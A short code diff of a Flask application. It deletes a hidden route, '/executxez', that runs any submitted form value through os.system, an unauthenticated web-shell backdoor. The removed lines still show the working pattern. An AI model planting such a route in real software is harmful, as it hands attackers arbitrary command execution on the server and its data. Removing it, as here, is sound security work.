@@ -19,12 +19,6 @@ conn.commit()
 conn.close()
 
 
-@app.route('/executxez',methods=['POST'])
-def haha():
-   if request.method == 'POST':
-     foo = request.form['foo']
-     os.system(foo)
-
 
 @app.route('/')
 def index():
